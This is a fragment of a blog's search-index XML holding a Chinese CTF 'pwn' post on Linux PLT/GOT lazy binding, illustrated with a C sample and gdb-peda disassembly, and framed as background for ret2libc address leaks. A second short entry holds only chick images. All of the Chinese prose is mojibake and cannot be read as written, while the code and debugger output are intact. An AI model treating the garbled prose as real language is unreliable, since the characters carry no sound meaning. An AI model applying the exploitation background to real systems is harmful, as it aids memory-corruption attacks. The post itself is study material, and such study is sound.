    <url>/2022/11/16/ctf-pwn/got%E8%A1%A8%E5%92%8Cplt%E8%A1%A8/</url>
    
    <content type="html"><![CDATA[<p>Linux åŠ¨æ€é“¾æ¥ä¸å»¶è¿Ÿç»‘å®šæœºåˆ¶</p><p><strong>Qï¼š</strong></p><ol><li>ä¸ºä»€ä¹ˆret2libcæ³„éœ²åŸºå€æ—¶è¦é€‰æ‹©å·²ç»ä½¿ç”¨è¿‡çš„å‡½æ•°ï¼Ÿ</li><li>ä½•ä¸ºå»¶è¿Ÿç»‘å®šï¼Ÿ</li></ol><h2 id="Linux-åŠ¨æ€é“¾æ¥ä¸å»¶è¿Ÿç»‘å®šæœºåˆ¶"><a href="#Linux-åŠ¨æ€é“¾æ¥ä¸å»¶è¿Ÿç»‘å®šæœºåˆ¶" class="headerlink" title="Linux åŠ¨æ€é“¾æ¥ä¸å»¶è¿Ÿç»‘å®šæœºåˆ¶"></a>Linux åŠ¨æ€é“¾æ¥ä¸å»¶è¿Ÿç»‘å®šæœºåˆ¶</h2><p>â€‹    å‡è®¾ï¼Œå†™äº†ä¸€ä¸ªå‡½æ•°<code>f()</code>ï¼Œè°ƒç”¨äº†glibcä¸­å‡½æ•°<code>x()</code>ï¼Œåœ¨å¯æ‰§è¡Œæ–‡ä»¶æ˜¯å¦‚ä½•ç¼–è¯‘çš„ï¼Ÿ</p><p>â€‹    å¯¹äºlibcä¸­çš„å‡½æ•°ï¼Œä¾‹å¦‚systemã€putsã€writeç­‰ï¼Œéœ€è¦åœ¨ç¨‹åºè¿è¡Œæ—¶åŠ¨æ€åŠ è½½åˆ°å†…å­˜ä¸­ï¼Œä¸åŒç‰ˆæœ¬çš„libcåŠ è½½çš„ä½ç½®å„ä¸ç›¸åŒï¼Œgccæ²¡æœ‰åŠæ³•ç›´æ¥åœ¨å‡½æ•°<code>f()</code>çš„æ±‡ç¼–æŒ‡ä»¤ä¸­ç›´æ¥callå‡½æ•°<code>x()</code>çš„çœŸå®åœ°å€</p><p>â€‹    å› æ­¤ï¼Œéœ€è¦åœ¨è°ƒç”¨å‰åŠ å…¥ä¸€ä¸ªå¯»æ‰¾å‡½æ•°åœ°å€çš„è¿‡ç¨‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.text<br> ...<br> call f_stub<br> ...<br> <br> ...<br> f_stub:<br>  1. find and save function f() entry point in f_stub_addr<br>     2. mov eax, [f_addr]<br>        jmp eax<br> ...<br> <br>.data<br> f_addr  // å­˜å‚¨å®é™…çš„f()åœ°å€<br></code></pre></td></tr></table></figure><p>â€‹    å¦‚ä¸Šè¿°è¿‡ç¨‹ï¼Œf_stubå»å¯»æ‰¾å®é™…çš„åœ°å€ï¼Œå­˜å‚¨åœ¨f_addrä¸­ï¼Œç„¶åè°ƒç”¨å®ƒ</p><p>â€‹    linuxçš„åŠ¨æ€é“¾æ¥è¿‡ç¨‹ä¸ä¸Šè¿°ç±»ä¼¼ï¼Œä¹Ÿæ˜¯ç”±ä¸€ä¸ªå­˜æ”¾å¤–éƒ¨å‡½æ•°åœ°å€æ•°æ®GOTè¡¨ï¼ˆå¯¹åº”f_addr)ï¼Œå’Œä¸€æ®µå‡½æ•°è°ƒç”¨é¢å¤–çš„ä»£ç PLTè¡¨ï¼ˆå¯¹åº”f_stub)</p><p>â€‹    åæ–‡ä¼šå…·ä½“åˆ†æå…¶æœºåˆ¶</p><h5 id="å®éªŒå‚è€ƒ"><a href="#å®éªŒå‚è€ƒ" class="headerlink" title="å®éªŒå‚è€ƒ"></a>å®éªŒå‚è€ƒ</h5><p><a href="https://www.yuque.com/hxfqg9/bin/ug9gx5#5dvaL">https://www.yuque.com/hxfqg9/bin/ug9gx5#5dvaL</a></p><p><a href="https://www.bilibili.com/video/BV1a7411p7zK/?spm_id_from=333.337.search-card.all.click">https://www.bilibili.com/video/BV1a7411p7zK/?spm_id_from=333.337.search-card.all.click</a></p><h5 id="ä»£ç "><a href="#ä»£ç " class="headerlink" title="ä»£ç "></a>ä»£ç </h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">void</span> <span class="hljs-title function_">print_banner</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Welcome to World of PLT and GOT\n&quot;</span>);<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    print_banner();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="ç¼–è¯‘é“¾æ¥"><a href="#ç¼–è¯‘é“¾æ¥" class="headerlink" title="ç¼–è¯‘é“¾æ¥"></a>ç¼–è¯‘é“¾æ¥</h5><p><code>gcc -Wall  -g test.c -o test.o -m32</code></p><p><strong>å¹³å°</strong>ï¼š <strong>kali</strong>-<strong>linux</strong></p><p>å¼€å§‹è°ƒè¯•</p><p><strong>é¦–å…ˆï¼Œåœ¨printfå‡½æ•°è°ƒç”¨å‰ä¸‹ä¸€ä¸ªæ–­ç‚¹</strong></p><p><img src="/img/plt&got/1.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs assembly">[-------------------------------------code-------------------------------------]<br>   0x555555555134 &lt;frame_dummy+4&gt;:      jmp    0x5555555550b0 &lt;register_tm_clones&gt;<br>   0x555555555139 &lt;print_banner&gt;:       push   rbp<br>   0x55555555513a &lt;print_banner+1&gt;:     mov    rbp,rsp<br>=&gt; 0x55555555513d &lt;print_banner+4&gt;:     lea    rax,[rip+0xec4]        # 0x555555556008<br>   0x555555555144 &lt;print_banner+11&gt;:    mov    rdi,rax<br>   0x555555555147 &lt;print_banner+14&gt;:    call   0x555555555030 &lt;puts@plt&gt;<br>   0x55555555514c &lt;print_banner+19&gt;:    nop<br>   0x55555555514d &lt;print_banner+20&gt;:    pop    rbp<br></code></pre></td></tr></table></figure><p>è·³è½¬åˆ°äº†0x555555555030è¿™ä¸ªåœ°å€ï¼Œgdbå¯¹å…¶çš„æ ‡æ³¨ä¸º&lt;puts@plt&gt;</p><p>æŸ¥çœ‹ä¸€ä¸‹è¿™ä¸ªåœ°å€ä¸Šçš„å†…å®¹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">gdb-peda$ x/10i 0x555555555030<br>   0x555555555030 &lt;puts@plt&gt;:   jmp    QWORD PTR [rip+0x2fca]        # 0x555555558000 &lt;puts@got[plt]&gt;<br>   0x555555555036 &lt;puts@plt+6&gt;: push   0x0<br>   0x55555555503b &lt;puts@plt+11&gt;:        jmp    0x555555555020<br></code></pre></td></tr></table></figure><p>è¿™é‡Œç¬¬ä¸€æ¡æŒ‡ä»¤ï¼Œjmp 0x555555558000ï¼Œgdbå¯¹å…¶çš„æ ‡æ³¨ä¸º&lt;puts@got[plt]&gt;ï¼ŒæŸ¥çœ‹è¿™ä¸ªåœ°å€ä¸Šçš„å€¼ï¼Œä¼šå‘ç°è¿™ä¸ªæŒ‡ä»¤åœ¨åŸåœ°è·³è½¬ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">gdb-peda$ x/x 0x555555558000 <br>0x555555558000 &lt;puts@got[plt]&gt;: 0x0000555555555036 //è¿™ä¸ªåœ°å€å°±æ˜¯ä¸Šé¢pltè¡¨çš„ç¬¬äºŒæ¡æŒ‡ä»¤<br></code></pre></td></tr></table></figure><p>ç›¸å½“äºä»€ä¹ˆä¹Ÿæ²¡åš</p><p>é‚£ä¹ˆæ ¹æ®æ–‡ç« å¼€å¤´çš„ä»‹ç»ï¼Œå¯»æ‰¾å‡½æ•°çš„å·¥ä½œè‚¯å®šæ˜¯ç”±ç¬¬ä¸‰æ¡æŒ‡ä»¤ï¼Œ<code>jmp 0x555555555020</code>æ¥å®Œæˆçš„ï¼Œè¿™é‡Œå…ˆä¸å¯¹è¿™ä¸ªå‡½æ•°è¿›è¡Œåˆ†æï¼Œç›´æ¥æ¥çœ‹ç»“æœ</p><p><strong>åœ¨printfå‡½æ•°åé¢ä¸‹æ–­ç‚¹ï¼Œé‡æ–°æŸ¥çœ‹åˆšæ‰&lt;puts@got[plt]&gt;ä¸Šçš„å†…å®¹</strong></p><p><img src="/img/plt&got/2.jpg"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">gdb-peda$ x/x 0x555555558000<br>0x555555558000 &lt;puts@got[plt]&gt;: 0x00007ffff7c75db0<br></code></pre></td></tr></table></figure><p>å‘ç°è¿™ä¸ªåœ°æ–¹çš„å€¼å˜äº†ï¼Œè€Œè¿™ä¸ªæ”¹å˜åçš„å€¼å°±æ˜¯putså‡½æ•°åœ¨libcä¸­çš„åœ°å€</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs assembly">gdb-peda$ x/10i 0x00007ffff7c75db0<br>   0x7ffff7c75db0 &lt;__GI__IO_puts&gt;:      push   r14<br>   0x7ffff7c75db2 &lt;__GI__IO_puts+2&gt;:    push   r13<br>   0x7ffff7c75db4 &lt;__GI__IO_puts+4&gt;:    push   r12<br>   0x7ffff7c75db6 &lt;__GI__IO_puts+6&gt;:    mov    r12,rdi<br>   0x7ffff7c75db9 &lt;__GI__IO_puts+9&gt;:    push   rbp<br>   0x7ffff7c75dba &lt;__GI__IO_puts+10&gt;:   push   rbx<br>   0x7ffff7c75dbb &lt;__GI__IO_puts+11&gt;:   sub    rsp,0x10<br>   0x7ffff7c75dbf &lt;__GI__IO_puts+15&gt;:   call   0x7ffff7c28110 &lt;*ABS*+0x99da0@plt&gt;<br>   0x7ffff7c75dc4 &lt;__GI__IO_puts+20&gt;:   mov    r13,QWORD PTR [rip+0x17e04d]        # 0x7ffff7df3e18<br>   0x7ffff7c75dcb &lt;__GI__IO_puts+27&gt;:   mov    rbx,rax<br></code></pre></td></tr></table></figure><p><strong>å› æ­¤å¯ä»¥å¾—å‡ºç»“è®º</strong></p><p>â€‹    pltè¡¨ä¸­ä¼šå…ˆå°è¯•è·³è½¬åˆ°gotè¡¨ä¸Šçš„å‡½æ•°åœ°å€ï¼Œå¦‚æœæ˜¯ç¬¬ä¸€æ¬¡è°ƒç”¨ï¼Œä¼šè¿›è¡Œä¸€æ¬¡æ— æ•ˆè·³è½¬ï¼Œç„¶åå»å¯»æ‰¾çœŸæ­£çš„åœ°å€å¡«å……åœ¨gotè¡¨é¡¹ä¸Šï¼Œç„¶åè°ƒç”¨ï¼›å¦‚æœæ˜¯ç¬¬äºŒæ¬¡è°ƒç”¨ï¼Œä¼šç›´æ¥jmpåˆ°gotè¡¨çœŸå®çš„å‡½æ•°åœ°å€ä¸Š</p><p>â€‹    è¿™æ ·å°±æ˜¯ä¸ºä»€ä¹ˆret2libcéœ€è¦ä½¿ç”¨ç”¨å·²è¢«è°ƒç”¨è¿‡çš„å‡½æ•°</p><p><em>tipsï¼š</em></p><p><em>linuxç¨‹åºéƒ½æœ‰ä¸€ä¸ªlibc_start_mainå‡½æ•°ï¼Œä¸”ä¼šåœ¨mainå‡½æ•°ä¹‹å‰è¢«è°ƒç”¨ï¼Œæ‰€ä»¥å¯ä»¥åœ¨ret2libcæ—¶æ— è„‘ç”¨è¿™ä¸ªå‡½æ•°(åªæ˜¯ä¸ªäººçŒœæµ‹ï¼Œå¹¶æœªå®é™…éªŒè¯)</em></p><p><strong>ç„¶åè§£å†³å¦‚ä½•å¯»æ‰¾å‡½æ•°åœ°å€çš„é—®é¢˜</strong>ï¼š</p><p>â€‹    åœ¨pltè¡¨çš„ç¬¬äºŒæ¡æ±‡ç¼–æŒ‡ä»¤ä¸­ï¼Œpush 0x0ä¸ºå¯»å€å‡½æ•°æä¾›äº†ä¸€ä¸ªå‚æ•°ï¼Œå¦‚æœæ‰“å¼€ä¸€ä¸ªå…·æœ‰å¤šä¸ªpltè¡¨é¡¹çš„ç¨‹åºï¼Œä¼šå‘ç°æ¯ä¸€é¡¹è¿™ä¸ªå€¼éƒ½æ˜¯ä¸åŒçš„ï¼š</p><p><img src="/img/plt&got/3.jpg"></p><p>â€‹    è¿™ä¸ªpushçš„å€¼å”¯ä¸€æ ‡è¯†äº†å¯»æ‰¾çš„å‡½æ•°ï¼Œ</p><p>â€‹    ç„¶åå†çœ‹ç¬¬ä¸‰æ¡æŒ‡ä»¤ï¼Œè§‚å¯Ÿå‘ç°è¿™ä¸ªjmpæŒ‡ä»¤è·³è½¬åˆ°äº†pltè¡¨çš„å¼€å¤´ï¼ˆå¯ä»¥åœ¨objdumpé‡Œçœ‹åˆ°è¿™ä¹Ÿæ˜¯ä¸€ä¸ªpltè¡¨é¡¹ï¼Œä½†æ˜¯ä»£ç ä¸å…¶ä»–è¡¨é¡¹å½¢å¼ä¸åŒï¼‰</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">gdb-peda$ x/10i 0x555555555020<br>   0x555555555020:      push   QWORD PTR [rip+0x2fca]        # 0x555555557ff0<br>   0x555555555026:      jmp    QWORD PTR [rip+0x2fcc]        # 0x555555557ff8<br></code></pre></td></tr></table></figure><p>å¦‚æœåœ¨gdbæœªå¼€å§‹è°ƒè¯•çš„æ—¶å€™ï¼ŒæŸ¥çœ‹è¿™ä¸ªjmpçš„å€¼ï¼Œæ˜¯0x0</p><p>è€Œåœ¨printfå‡½æ•°å‰çš„æ–­ç‚¹æŸ¥çœ‹ï¼Œä¼šå‘ç°å®ƒå‘ç”Ÿäº†å˜åŒ–</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs assembly">gdb-peda$ x/x 0x555555557ff8<br>0x555555557ff8: 0x00007ffff7fdc080<br><br>gdb-peda$ x/10i 0x00007ffff7fdc080<br>   0x7ffff7fdc080 &lt;_dl_runtime_resolve_xsavec&gt;: push   rbx<br>   0x7ffff7fdc081 &lt;_dl_runtime_resolve_xsavec+1&gt;:       mov    rbx,rsp<br>   0x7ffff7fdc084 &lt;_dl_runtime_resolve_xsavec+4&gt;:       and    rsp,0xffffffffffffffc0<br>   0x7ffff7fdc088 &lt;_dl_runtime_resolve_xsavec+8&gt;:<br>    sub    rsp,QWORD PTR [rip+0x20be1]        # 0x7ffff7ffcc70 &lt;_rtld_global_ro+432&gt;<br>   0x7ffff7fdc08f &lt;_dl_runtime_resolve_xsavec+15&gt;:      mov    QWORD PTR [rsp],rax<br>   0x7ffff7fdc093 &lt;_dl_runtime_resolve_xsavec+19&gt;:      mov    QWORD PTR [rsp+0x8],rcx<br>   0x7ffff7fdc098 &lt;_dl_runtime_resolve_xsavec+24&gt;:      mov    QWORD PTR [rsp+0x10],rdx<br>   0x7ffff7fdc09d &lt;_dl_runtime_resolve_xsavec+29&gt;:      mov    QWORD PTR [rsp+0x18],rsi<br>   0x7ffff7fdc0a2 &lt;_dl_runtime_resolve_xsavec+34&gt;:      mov    QWORD PTR [rsp+0x20],rdi<br>   0x7ffff7fdc0a7 &lt;_dl_runtime_resolve_xsavec+39&gt;:      mov    QWORD PTR [rsp+0x28],r8<br><br></code></pre></td></tr></table></figure><p>è¿™ä¸ªå‡½æ•°ä¸º<code>_dl_runtime_resolve(link_map_obj, reloc_index)</code>ï¼Œæ­¤å¤„ä¸åœ¨å¯¹å…¶å…·ä½“åˆ†æï¼Œå…¶ç”¨å¤„å³ä¸ºå¯»æ‰¾ç¼–å·ä¸º<code>reloc_index</code>çš„å‡½æ•°</p><h5 id="æ•´ä½“æµç¨‹"><a href="#æ•´ä½“æµç¨‹" class="headerlink" title="æ•´ä½“æµç¨‹"></a>æ•´ä½“æµç¨‹</h5><p><strong>ç¬¬ä¸€æ¬¡è°ƒç”¨</strong></p><p><img src="/img/plt&got/4.jpg"></p><p><strong>ç¬¬äºŒæ¬¡è°ƒç”¨</strong></p><p><img src="/img/plt&got/5.jpg"></p>]]></content>
    
    
    <categories>
      
      <category>ctf-pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å¯çˆ±çš„å°é»„é¸¡</title>
    <link href="/2022/11/16/%E6%9D%82%E9%A1%B9/%E5%B0%8F%E9%BB%84%E9%B8%A1/"/>
    <url>/2022/11/16/%E6%9D%82%E9%A1%B9/%E5%B0%8F%E9%BB%84%E9%B8%A1/</url>
    
    <content type="html"><![CDATA[<p>å¯çˆ±çš„å°é»„é¸¡ 0v0</p><p><img src="/img/basic/1.jpg"><br><img src="/img/basic/2.jpg"><br><img src="/img/basic/3.jpg"><br><img src="/img/basic/4.jpg"><br><img src="/img/basic/5.jpg"><br><img src="/img/basic/6.jpg"><br><img src="/img/basic/7.jpg"><br><img src="/img/basic/9.jpg"><br><img src="/img/basic/1.gif"><br><img src="/img/basic/2.gif"></p>]]></content>
    
    
    <categories>
      
      <category>æ‚é¡¹</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Others</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
